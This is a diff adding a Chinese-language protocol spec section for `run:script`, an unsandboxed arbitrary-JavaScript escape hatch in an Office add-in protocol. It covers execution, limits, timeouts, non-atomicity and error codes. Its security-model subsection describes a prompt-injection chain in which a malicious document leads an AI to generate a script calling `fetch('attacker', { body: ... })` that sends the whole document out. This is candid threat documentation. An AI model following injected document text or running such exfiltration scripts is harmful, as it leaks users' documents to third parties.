@@ -341,6 +341,7 @@ PPT 中的位置和尺寸使用 **磅 (point)** 为单位。
 | 复杂查询 | 30 秒 |
 | 修改操作 | 30 秒 |
 | 批量操作 | 60 秒 |
+| 脚本执行（`run:script`） | 60 秒（缺省，可经请求 `timeoutMs` 覆盖，**无硬上限**）——详见[§脚本执行](#run-script) |
 
 ### 超时处理
 
@@ -434,3 +435,74 @@ AddIn 连接时 **MUST** 在 `auth` 对象中声明 `oaspVersion`（与 `clientI
 
 - **非目标**（有意排除，保持机制最小）：capabilities 特性发现、自动协商降级、单 Server 实例多协议版本共存、peer-to-peer 协商。多版本并存靠部署拓扑解决——一个 Server 实例只讲一个协议版本。
 - **版本握手 ≠ 运行时能力**：协议版本握手回答「两端能不能说同一种 OASP」（连接期、一次性、强制）；运行时能力（如某 Office.js `PowerPointApi` requirement set 1.2 / 1.8 是否可用）回答「这台宿主此刻能不能做某动作」（操作期、按需）。二者**正交**——握手通过不代表某具体能力可用；能力不满足在操作期由 [`3016 API_NOT_SUPPORTED`](error-handling.md) **反应式**处理，不在握手期校验。
+
+## 脚本执行 {#run-script}
+
+本节定义 `{namespace}:run:script`（`excel:run:script` / `word:run:script` / `ppt:run:script`）的共享执行语义、大小限制、超时、安全模型、非原子性与错误映射。三命名空间**语义完全一致**，仅注入的宿主 `context` 不同。请求/结果结构见[数据结构 · 脚本执行](data-structures.md#script-execution)。
+
+### 定位
+
+`run:script` 是**封装层逃生舱（escape hatch）**，**不替代** typed 事件。它服务且仅服务两类场景：① Office.js 有能力但协议尚未封装；② 某 typed 事件有 Bug、修复前该能力归零。调用方**应优先使用 typed 事件**，仅在其覆盖不到或不可用时使用本事件；高频脚本应沉淀为新的 typed 事件——`run:script` 兼作新能力的孵化器。
+
+### 执行语义（规范层）
+
+- 脚本以 **async 函数体**语义执行（等价于 `new AsyncFunction(...)`，**非** `eval`），可用 `await`、可用 `return` 返回结果。
+- 注入三个名字：`context`（对应命名空间的宿主 `RequestContext`——Excel `Excel.RequestContext` / Word `Word.RequestContext` / PPT `PowerPoint.RequestContext`）、`args`（请求的 `args`，缺省 `{}`）、`console`（捕获式，输出按序进 `ScriptResult.logs`）。宿主全局 `Excel` / `Word` / `PowerPoint` / `Office` / `OfficeRuntime` / `OfficeExtension` 本就在全局作用域，**不额外注入**。
+- 脚本成功结束后，AddIn **MUST** 补一次 `context.sync()`，使「只写不读、未显式 sync」的脚本也落盘。
+- `result` 经 `JSON.stringify` + replacer 序列化为纯 JSON：先调 `toJSON()` 再调 replacer，故 Office.js `ClientObject`（Range / Table / Chart …）可直接 `return`，得到其已 `load` 的属性快照；循环引用降级为 `"[Circular]"`，函数字段剔除；无 `return` 时 `result` 为 `null`。
+
+### 大小限制（规范层，线缆字节）
+
+以 **UTF-8 字节**计（**非字符**——CJK 下字节可达字符数三倍，且 socket.io 接收缓冲以字节计）：
+
+- `result` 序列化后 **> 512 KB** → 整请求失败，返回 [`3006 CONTENT_TOO_LARGE`](error-handling.md)（`details.phase:"serialize"`）。大范围数据应改用 typed 事件（如 `excel:get:range`）或在脚本内聚合，不经逃生舱搬运。
+- `logs` 总量 **> 100 KB** → 截断并置 `logsTruncated: true`（**不**使请求失败）。单行长度等细分阈值为实现细节。
+
+### 超时（规范层）
+
+- 「脚本执行」档缺省 **60000 ms**，可经请求 `timeoutMs` 覆盖，**无硬上限**（脚本时长只有调用方知道）。
+- 超时返回 [`1002 TIMEOUT`](error-handling.md)（`details.phase:"execute"`，带截断前 `logs`）。
+- **非抢占局限**：超时后 AddIn **应尽力中止**（如在后续 `await context.sync()` 处拒绝），但**同步 JS 不可抢占**——脚本内的同步长循环会独占宿主线程直至自行结束，超时计时器亦无法插入。调用方**不得**假设超时即刻停机，须结合下节[非原子性](#run-script-atomicity)理解可能的残留副作用。
+
+### 安全模型（规范层，MUST 阅读）
+
+!!! danger "这不是沙箱，且沙箱与本事件的目的在定义上互斥"
+    `run:script` 以 `AsyncFunction` 执行仅隔掉宿主的**局部词法作用域**，**全局对象完全敞开**——脚本可触达 `window` / `fetch` / `localStorage` / Socket.IO client 本身。叠加 manifest 的 `ReadWriteDocument`：**谁能下发脚本，谁就完全控制用户文档与该 taskpane 的浏览器上下文。**
+
+- **沙箱化会摧毁本事件的价值**：Office.js 对象是绑定在 AddIn 页面 realm 上的代理对象，无法穿越 iframe / Worker 隔离边界；给脚本套可序列化 RPC 门面即等于重新发明 Office Scripts 的受限 API，而「直接调原生 Office.js」正是本事件的全部价值。故本协议**有意不引入**任何脚本沙箱。
+- **信任边界 = 握手鉴权**：安全性 100% 依赖脚本来源可信度，即 Socket.IO 连接握手的鉴权（见[连接与握手](connection.md)）。这是防线的全部，不存在其他「防护」。
+- **本事件独有的攻击面**：typed 事件只能把文档内容发回已认证的自有 Server；脚本能触达 `fetch`，可发往**任意第三方**。而 Office 文档本身是攻击者可控输入，故存在「恶意文档提示词注入 → AI 读文档 → AI 生成含 `fetch('attacker', { body: 全文 })` 的脚本 → 执行外泄」这条 **typed 事件不可达**的链路。规范如实记录此链，不淡化。
+- **人在环确认不在 OASP**：对「执行前是否要终端用户确认」的把关由**上层 Agent 层**承担——Agent 宿主对**任意** MCP 工具调用统一提供二次确认（如 permission prompt）。OASP / AddIn 为**纯能力提供方**，`run:script` 与其余 typed 事件一样静默放行、**不自建确认门、不提供安全边界**。若 Agent 宿主被配置为自动批准，该确认随之失效——这是宿主配置域的责任，OASP 不兜底。
+
+### 非原子性（规范层）{#run-script-atomicity}
+
+!!! warning "run:script 不提供任何原子性 / 回滚保证"
+    与 typed 事件不同，`run:script` 失败时**文档可能处于任意中间状态**。非原子性有两层，Office.js 均无事务 / 回滚 API 可消除：
+
+    1. **跨 sync 非原子**：脚本「写 A → `await sync()` → 写 B → throw」时，A 已往返落盘、不可回滚；B 尚在本地命令队列、随失败丢弃。即 **throw 前每次成功 sync 的写入全部残留**。
+    2. **单次 sync 内部非原子**：一次 `sync()` 把命令队列整批发往宿主，宿主按序执行、在首条失败命令处停止、**之前的命令不回滚**。故哪怕只有一次 sync 也可能残留半批写入。
+
+    需要对账的调用方**应在脚本内自行 read-back** 校验最终状态。
+
+### 错误映射（规范层）{#run-script-errors}
+
+`details` 是本事件的核心——脚本多由 LLM 生成，靠回包自我修正。全部复用[共享错误码注册表](error-handling.md)，**零新增码**：
+
+| 触发条件（线缆可观测） | 错误码 | `details` |
+|---|---|---|
+| 缺 `script` | `4001 MISSING_PARAM` | — |
+| `timeoutMs` 越界（如负数） | `4004 PARAM_OUT_OF_RANGE` | — |
+| `args` 不可 JSON 序列化 | `4003 INVALID_PARAM_TYPE` | — |
+| 脚本**语法错**（编译期拦下，未触碰文档） | `4002 INVALID_PARAM` | `phase:"compile"`, `name`, `stack` |
+| 宿主**不支持动态代码构造**（CSP 拦截 `AsyncFunction`，编译期，未触碰文档） | `3016 API_NOT_SUPPORTED` | `phase:"compile"` |
+| 脚本**自身抛错**（TypeError / ReferenceError / 主动 throw） | `3004 OPERATION_FAILED` | `phase:"execute"`, `fault:"script"`, `name`, `stack`, `logs` |
+| 脚本调用 **Office.js 失败** | `3004 OPERATION_FAILED` | `phase:"execute"`, `fault:"office"`, `officeCode`, `debugInfo?`, `stack`, `logs` |
+| 执行**超时** | `1002 TIMEOUT` | `phase:"execute"`, `logs` |
+| `result` **过大**（见大小限制） | `3006 CONTENT_TOO_LARGE` | `phase:"serialize"` |
+
+- `phase` ∈ `"compile" | "execute" | "serialize"`，标识失败阶段。
+- `fault` ∈ `"script" | "office"`（仅 `execute` 阶段），区分「脚本自身缺陷」与「文档操作被宿主拒绝」——AI 据此决定**重写脚本** vs **调整操作**。判据为 `error instanceof OfficeExtension.Error`。
+- `officeCode` = `OfficeExtension.Error.code`（如 `InvalidArgument` / `ItemNotFound`）。`debugInfo` 为 `OfficeExtension.DebugInfo` 的**不透明透传**，其 `errorLocation` 等字段**可缺省**（`GeneralException` 常无），消费方**不得**假设其存在。
+
+!!! note "compile 期语义安全"
+    语法错与 CSP 拦截均在 `AsyncFunction` 构造期发生，**先于**任何 `*.run` 调用——`RequestContext` 尚未创建、文档零接触，故这两类失败**保证无副作用**。
